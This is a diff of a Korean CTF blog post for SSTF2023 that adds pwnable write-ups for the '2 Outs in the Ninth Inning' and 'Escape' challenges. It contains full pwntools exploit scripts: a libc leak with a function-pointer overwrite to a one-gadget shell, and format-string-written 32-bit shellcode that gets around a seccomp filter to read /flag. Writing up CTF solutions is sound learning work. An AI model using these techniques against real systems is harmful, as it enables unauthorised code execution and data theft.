@@ -1,10 +1,154 @@
 ---
 layout: post
 date: 2023-11-24
-title: "SSTF2023 heapster write-up"
+title: "SSTF2023 pwnable write-up"
 tags: [pwnable, ]
 categories: [CTF, SSTF2023, ]
 ---
+
+
+# **2 Outs in the Ninth Inning**
+
+
+libc 함수의 주소를 출력해주며, 이후에 fgets를 통해 입력을 받을 때 버퍼 오버플로우가 발생하여 함수 포인터를 덮을 수 있다.
+
+
+이를 one gadget 위치로 변조하여 쉘을 획득하였다.
+
+
+```sql
+from pwn import *
+import ctypes
+#lscontext.log_level = 'debug'
+
+p = remote('2outs.sstf.site', 1337)
+# libc = ctypes.CDLL("./libc.so")
+
+# p = process('./9end2outs')
+e = ELF('./9end2outs')
+libc = e.libc
+clibc = ctypes.CDLL(e.libc.path)
+
+def s(x): return p.send(x)
+def sl(x): return p.sendline(x)
+def sa(x, y): return p.sendafter(x, y)
+def sla(x, y): return p.sendlineafter(x, y)
+def ru(x): return p.recvuntil(x)
+def rl(): return p.recvline()
+def ia(): return p.interactive()
+
+pitches = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
+sla('The 1st chacne', 'puts')
+ru('Libc function \'puts\' is at ')
+puts = int(ru('\n')[:-2],16)
+success('puts: ' + hex(puts))
+
+sla('The 2nd chacne', 'puts')
+pause()
+
+libc_base = puts - libc.sym['puts']
+system = libc_base + 0xebcf8
+
+# sla('Can you guess the pitcher\'s selection', (pitches[libc.rand() % 26]) * 16)
+sla('Can you guess the pitcher\'s selection', p64(system) * 100)
+
+ia()
+```
+
+
+![0](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/0.png)
+
+
+# **Escape**
+
+
+seccomp 필터가 걸린 이후에 포맷스트링 프리미티브를 제공해준다.
+
+
+seccomp 필터는 open, execve 등 플래그를 읽을 수 있는 시스템콜을 막아두었다.
+
+
+![1](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/1.png)
+
+
+seccomp 필터에서 x64 시스템콜이 아닐 때에 대한 조건이 없기 때문에 32비트 시스템콜을 이용하여 플래그 파일을 open하고 출력하였다.
+
+
+```sql
+from pwn import *
+context.log_level = 'debug'
+
+p = remote('escape.sstf.site', 5051)
+# p = process('./escape')
+e = ELF('./escape')
+
+
+def s(x): return p.send(x)
+def sl(x): return p.sendline(x)
+def sa(x, y): return p.sendafter(x, y)
+def sla(x, y): return p.sendlineafter(x, y)
+def ru(x): return p.recvuntil(x)
+def rl(): return p.recvline()
+def ia(): return p.interactive()
+
+def write_shellcode(shellcode, base):
+    context.bits = 64
+    idx = 0
+
+    for i in range(0, len(shellcode), 8):
+        addr = base + idx * 8
+        # success('addr -> {}'.format(hex(addr)))
+        # success('shellcode -> {}'.format(shellcode[i:i+8]))
+        sla('Enter:', fmtstr_payload(
+            8, {addr: shellcode[i:i+8]}, write_size='byte'))
+        idx += 1
+
+shellcode = asm('''
+mov rax, 0
+mov rbx, 0
+mov rcx ,0
+mov rdx, 0
+mov rsi, 0
+mov rdi, 0
+''', arch='amd64')
+                
+shellcode += asm('''
+mov eax, 5
+mov ebx, 0x50510200
+mov ecx, 0
+mov edx, 0
+int 0x80
+                 
+mov ebx, eax
+
+mov eax, 3
+mov ecx, 0x50510200
+mov edx, 0x100
+int 0x80
+
+mov eax, 4
+mov ebx, 1
+mov ecx, 0x50510200
+mov edx, 0x100
+int 0x80
+''', arch='i386')
+
+write_shellcode(b'/flag\x00\x00\x00', 0x50510200)
+write_shellcode(shellcode, 0x50510000)
+
+# pause()
+sla('Enter:', 'done')
+rl()
+success(rl())
+
+ia()
+```
+
+
+![2](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/2.png)
+
+
+# Heapster
 
 
 ## 코드 분석
@@ -16,7 +160,7 @@ categories: [CTF, SSTF2023, ]
 1번부터 4번까지의 선택지가 있으며, 다른 것을 입력할 경우 return 된다.
 
 
-![0](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/0.png)
+![3](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/3.png)
 
 
 ### 1. add
@@ -31,7 +175,7 @@ categories: [CTF, SSTF2023, ]
 힙 청크 + 16 위치는 1로 초기화되며, 이후에 버퍼에 입력 받은 데이터를 힙 청크에 복사한다.
 
 
-![1](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/1.png)
+![4](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/4.png)
 
 
 ### 2. del
@@ -40,7 +184,7 @@ categories: [CTF, SSTF2023, ]
 입력 받은 인덱스의 노드를 free 한다.
 
 
-![2](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/2.png)
+![5](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/5.png)
 
 
 ### 3. print
@@ -49,7 +193,7 @@ categories: [CTF, SSTF2023, ]
 모든 노드를 순회하며 노드의 값이 0이 아닌 경우 즉, 노드가 할당된 적이 있었던 경우에 노드의 내용을 출력한다.
 
 
-![3](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/3.png)
+![6](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/6.png)
 
 
 ### 4. validation
@@ -58,7 +202,7 @@ categories: [CTF, SSTF2023, ]
 지역 변수에 `92eab7870b69dfb99c62db3ca075b222be8822a861bbfbbbc94f4b536682fe52` 문자열을 복사한 이후에 모든 노드를 순회하면서 해당 노드가 할당되어 있다면 지역변수와 비교를 수행한 후 같으면 1, 다르면 0을 반환한다.
 
 
-![4](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/4.png)
+![7](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/7.png)
 
 
 ## 취약점 분석
@@ -222,5 +366,5 @@ ia()
 ```
 
 
-![5](/assets/img/2023-11-24-SSTF2023-heapster-write-up.md/5.png)
+![8](/assets/img/2023-11-24-SSTF2023-pwnable-write-up.md/8.png)
 
